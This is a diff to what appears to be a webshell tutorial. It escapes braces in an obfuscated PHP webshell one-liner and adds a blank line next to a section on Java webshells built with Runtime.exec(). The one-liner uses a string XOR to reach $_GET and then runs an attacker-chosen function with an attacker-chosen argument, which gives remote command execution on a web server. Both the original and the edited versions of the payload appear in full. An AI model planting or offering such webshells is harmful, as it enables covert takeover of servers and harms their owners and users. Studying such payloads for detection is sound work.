@@ -220,6 +220,7 @@ Java provides two main classes **`Runtime`** and **`ProcessBuilder`** which are 
 #### **Using `Runtime.getRuntime().exec()`**
 
 The `Runtime` class provides a method **`exec()`**, which allows Java applications to execute external commands. Here’s an example of how a simple Java webshell could be implemented using this method:
+
 ```
 `import java.io.*;
 
@@ -437,13 +438,13 @@ Same but using POST:
 ### Advanced Ofuscated Webshells
 
 ```
-<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>
+<?php $_=${'_'.('\{\{\{' ^ '<>/')};$_[0]($_[1]); ?>
 ```
 
 This part generates a global variable:
 
 ```
-$_=${'_'.('{{{' ^ '<>/')};
+$_=${'_'.('\{\{\{' ^ '<>/')};
 ```
 
 - `{{{ ^ <>/` performs a bitwise operation between strings.
